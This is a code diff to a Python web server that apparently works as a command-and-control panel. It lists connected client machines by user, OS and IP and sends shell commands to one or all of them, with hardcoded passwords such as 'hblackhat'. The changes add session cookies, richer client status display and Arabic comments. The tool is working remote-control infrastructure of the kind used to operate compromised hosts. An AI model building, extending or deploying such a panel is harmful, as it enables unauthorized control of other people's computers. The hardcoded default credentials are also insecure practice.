@@ -11,22 +11,78 @@ import os
 from datetime import datetime
 import socketserver
 
-class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
-    """Multi-threaded HTTP server for handling concurrent connections"""
-    daemon_threads = True
-    allow_reuse_address = True
-
 class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     sessions = {}
     commands_queue = {}
     failed_attempts = {}
+    blocked_ips = set()
+    
+    # 🔒 🔥 نظام الجلسات الجديد - ضعه هنا
+    user_sessions = {}
+    session_timeout = 3600  # ساعة واحدة
     
     # ⚡ INSTANT PASSWORD SYSTEM
     PASSWORD_FILE = "passwords.json"
     DEFAULT_PASSWORDS = {
-        "user_password": "hblackhat",
+        "user_password": "hblackhat", 
         "admin_password": "sudohacker"
     }
+    
+    # 🔒 دوال نظام الجلسات
+    def create_session(self, user_type):
+        """إنشاء جلسة جديدة"""
+        session_id = str(uuid.uuid4())
+        self.user_sessions[session_id] = {
+            'user_type': user_type,
+            'created_at': time.time(),
+            'last_activity': time.time(),
+            'ip': self.client_address[0]
+        }
+        return session_id
+    
+    def validate_session(self, session_id):
+        """التحقق من صحة الجلسة"""
+        if session_id in self.user_sessions:
+            session = self.user_sessions[session_id]
+            if (time.time() - session['last_activity'] < self.session_timeout and 
+                session['ip'] == self.client_address[0]):
+                session['last_activity'] = time.time()
+                return session
+            else:
+                del self.user_sessions[session_id]
+        return None
+    
+    def require_auth(self, required_level="user"):
+        """🔒 التحقق من المصادقة"""
+        session_id = self.get_session_id()
+        if not session_id:
+            return False
+        session = self.validate_session(session_id)
+        if not session:
+            return False
+        if required_level == "admin" and session['user_type'] != "admin":
+            return False
+        return True
+    
+    def get_session_id(self):
+        """الحصول على معرف الجلسة من الكوكيز"""
+        cookie_header = self.headers.get('Cookie', '')
+        cookies = {}
+        for cookie in cookie_header.split(';'):
+            if '=' in cookie:
+                key, value = cookie.strip().split('=', 1)
+                cookies[key] = value
+        return cookies.get('session_id')
+    
+    def set_session_cookie(self, session_id):
+        """تعيين كوكي الجلسة"""
+        self.send_header('Set-Cookie', f'session_id={session_id}; HttpOnly; Path=/; Max-Age=3600')
+        
+    def send_redirect(self, location):
+        """إعادة توجيه المستخدم"""
+        self.send_response(302)
+        self.send_header('Location', location)
+        self.end_headers()
     
     def load_passwords(self):
         """INSTANT password loading"""
@@ -758,6 +814,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         expected_hash = self.get_password_hash("user_password")
         
         if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
+            session_id = self.create_session("user")
+            self.set_session_cookie(session_id)
             self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
             self.log_security_event("Level 1 authentication successful")
             self.send_json({'success': True, 'instant': True})
@@ -781,6 +839,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         expected_hash = self.get_password_hash("admin_password")
         
         if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
+            session_id = self.create_session("admin") 
+            self.set_session_cookie(session_id)
             self.log_security_event("Admin authentication successful")
             self.send_json({'success': True, 'instant': True})
         else:
@@ -789,6 +849,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             self.send_json({'success': False})
 
     def send_control_panel(self):
+            # 🔒 التحقق من المصادقة أولاً
+        if not self.require_auth("admin"):
+            self.send_redirect('/')
+            return
         html = '''
         <!DOCTYPE html>
         <html>
@@ -1255,7 +1319,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     
                     currentOSTab = osType;
                 }
-                
+                //الدالة loadSessions تعمل على تحميل وعرض قائمة الجلسات/العملاء مع تحديث حالتهم في الوقت الفعلي
                 async function loadSessions() {
                     try {
                         const response = await fetch('/sessions?_t=' + Date.now());
@@ -1275,14 +1339,56 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             const now = Date.now();
                             const timeDiff = (now - lastSeen) / 1000;
                             
-                            // 🟢 بسيط: أقل من 60 ثانية = أخضر، أكثر = أحمر
-                            const isOnline = timeDiff < 60;
+                            // 🟢 شروط أكثر وضوحاً وتحديثاً أفضل
+                            let isOnline = true;
+                            let statusClass = 'online-status';
+                            let statusText = 'ONLINE';
+                            let statusColor = '#28a745';
+                            let statusEmoji = 'yes';
                             
-                            const statusClass = isOnline ? 'online-status' : 'online-status offline';
-                            const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
-                            const statusColor = isOnline ? '#28a745' : '#dc3545';
+                            if (timeDiff < 30) {
+                                // 🟢 اتصال نشط جداً (أقل من 30 ثانية)
+                                isOnline = true;
+                                statusClass = 'online-status';
+                                statusText = 'LIVE';
+                                statusColor = '#28a745';
+                                statusEmoji = '🟢';
+                            } else if (timeDiff < 120) {
+                                // 🟡 اتصال حديث (أقل من دقيقتين)
+                                isOnline = true;
+                                statusClass = 'online-status';
+                                statusText = 'ONLINE';
+                                statusColor = '#28a745';
+                                statusEmoji = '🟢';
+                            } else if (timeDiff < 300) {
+                                // 🟠 اتصال مؤخراً (أقل من 5 دقائق)
+                                isOnline = true;
+                                statusClass = 'online-status';
+                                statusText = 'RECENT';
+                                statusColor = '#ffc107';
+                                statusEmoji = '🟡';
+                            } else {
+                                // 🔴 غير متصل (أكثر من 5 دقائق)
+                                isOnline = false;
+                                statusClass = 'online-status offline';
+                                statusText = 'OFFLINE';
+                                statusColor = '#dc3545';
+                                statusEmoji = '🔴';
+                            }
                             
                             const isSelected = client.id === currentClientId;
+                            
+                            // ⏱️ تنسيق الوقت بشكل أفضل
+                            let timeDisplay = '';
+                            if (timeDiff < 60) {
+                                timeDisplay = `${Math.floor(timeDiff)}s ago`;
+                            } else if (timeDiff < 3600) {
+                                timeDisplay = `${Math.floor(timeDiff / 60)}m ago`;
+                            } else if (timeDiff < 86400) {
+                                timeDisplay = `${Math.floor(timeDiff / 3600)}h ago`;
+                            } else {
+                                timeDisplay = `${Math.floor(timeDiff / 86400)}d ago`;
+                            }
                             
                             return `
                                 <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
@@ -1292,8 +1398,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                                     <small>User: ${client.user || 'Unknown'}</small><br>
                                     <small>OS: ${client.os || 'Unknown'}</small><br>
                                     <small>IP: ${client.ip}</small><br>
-                                    <small>Last: ${timeDiff.toFixed(0)}s ago</small>
-                                    <small style="color: ${statusColor}; font-weight: bold;"> • ${statusText}</small>
+                                    <small>Last: ${timeDisplay}</small>
+                                    <small style="color: ${statusColor}; font-weight: bold;"> ${statusEmoji} ${statusText}</small>
                                 </div>
                             `;
                         }).join('');
@@ -1301,7 +1407,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         console.error('Error loading sessions:', error);
                     }
                 }
-                
+                //الدالة updateSessionStats تعمل على تحديث إحصائيات الجلسات/العملاء في واجهة المستخدم
                 function updateSessionStats(sessions) {
                     const total = sessions.length;
                     const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000).length;
@@ -1311,14 +1417,14 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     document.getElementById('commandsSent').textContent = commandCounter;
                     document.getElementById('clientsCount').textContent = total;
                 }
-                
+                //لدالة selectClient تعمل على اختيار وتحديد عميل معين في النظام
                 function selectClient(clientId) {
                     currentClientId = clientId;
                     loadSessions();
                     document.getElementById('currentClient').textContent = clientId;
                     addToTerminal(`Selected client: ${clientId}\\n`);
                 }
-                
+                //الدالة executeCommand تعمل على تنفيذ أوامر على العميل المحدد
                 function executeCommand(command) {
                     if (!currentClientId) {
                         alert('Please select a client first!');
@@ -1326,7 +1432,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     }
                     executeSingleCommand(currentClientId, command);
                 }
-                
+                //الدالة executeSingleCommand تعمل على إرسال أمر إلى عميل معين والتعامل مع النتائج
                 async function executeSingleCommand(clientId, command) {
                     commandCounter++;
                     const startTime = Date.now();
@@ -1350,14 +1456,14 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         addToTerminal(` Network error: ${err}\\n`);
                     }
                 }
-                
+                //لدالة executeAll تعمل على تنفيذ أمر على جميع العملاء النشطين.
                 function executeAll(command) {
                     if (allClients.length === 0) {
                         alert('No clients connected!');
                         return;
                     }
                     
-                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000);
+                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 300000);
                     if (activeClients.length === 0) {
                         alert('No active clients!');
                         return;
@@ -1369,8 +1475,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         executeSingleCommand(client.id, command);
                     });
                 }
-                
-                function executeSelected(inputId) {
+             // لدالة executeSelected تعمل على تنفيذ أمر من حقل إدخال محدد على العميل المحدد
+              function executeSelected(inputId) {
                     const command = document.getElementById(inputId).value.trim();
                     if (!command) {
                         alert('Please enter a command');
@@ -1382,8 +1488,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     } else {
                         alert('Please select a client first');
                     }
-                }
-                
+                }  
+                //الدالة executeCustomCommand تعمل على تنفيذ أمر مخصص من حقل إدخال وتنظيفه بعد التنفيذ
                 function executeCustomCommand() {
                     const cmd = document.getElementById('commandInput').value.trim();
                     if (cmd) {
@@ -1393,7 +1499,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         alert('Please enter a command');
                     }
                 }
-                
+                //الدالة waitForResult تعمل على انتظار وفحص نتيجة تنفيذ الأمر من العميل بشكل فوري ومتكرر.
                 function waitForResult(clientId, command, startTime) {
                     let attempts = 0;
                     const maxAttempts = 100; // More attempts for instant response
@@ -1424,17 +1530,17 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     };
                     checkImmediately();
                 }
-                
+                //الدالة addToTerminal تعمل على إضافة نص إلى الطرفية (Terminal) وجعلها تتمركز تلقائياً على أحدث محتوى.
                 function addToTerminal(text) {
                     const terminal = document.getElementById('terminal');
                     terminal.textContent += text;
                     terminal.scrollTop = terminal.scrollHeight;
                 }
-                
+                //الدالة openSettings تعمل على فتح صفحة الإعدادات في نافذة أو تبويب جديد.
                 function openSettings() {
                     window.open('/settings', '_blank');
                 }
-                
+                //الدالة logout تعمل على تسجيل خروج المستخدم بعد التأكيد.
                 function logout() {
                     if (confirm('Are you sure you want to logout?')) {
                         window.location = '/';
@@ -1442,7 +1548,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 }
                 
                 // ⚡ Ultra-fast auto-refresh every 1 second
-                setInterval(loadSessions, 1000);
+                setInterval(loadSessions, 100);
                 loadSessions();
             </script>
         </body>
@@ -1528,20 +1634,36 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         with self.session_lock:
             current_time = datetime.now()
             active_clients = []
-        
+            
             for client_id, client_data in list(self.sessions.items()):
                 last_seen = datetime.fromisoformat(client_data['last_seen'])
                 time_diff = (current_time - last_seen).total_seconds()
-            
-                if time_diff < 300:  # 0.5 minutes
-                    client_data['is_online'] = time_diff < 5  # ⚡ 5 seconds for online
+                
+                # 🎯 ابقاء العملاء النشطين فقط (أقل من 5 دقائق)
+                if time_diff < 300:
+                    # 🔥 نظام حاسم وبسيط
+                    if time_diff < 10:
+                        status = "🟢 LIVE"
+                        is_online = True
+                    elif time_diff < 30:
+                        status = "🟢 ONLINE" 
+                        is_online = True
+                    elif time_diff < 120:
+                        status = "🟡 RECENT"
+                        is_online = True
+                    else:
+                        status = "🔴 OFFLINE"
+                        is_online = False
+                    
+                    client_data['is_online'] = is_online
+                    client_data['status'] = status
                     client_data['last_seen_seconds'] = time_diff
                     active_clients.append(client_data)
                 else:
+                    # 🗑️ تنظيف العملاء القدامى
                     del self.sessions[client_id]
-                    print(f"INSTANT Removed inactive: {client_id}")
-        
-            self.send_json(active_clients)    
+            
+            self.send_json(active_clients)   
     def handle_get_commands(self):
         with self.session_lock:
             parsed = urllib.parse.urlparse(self.path)
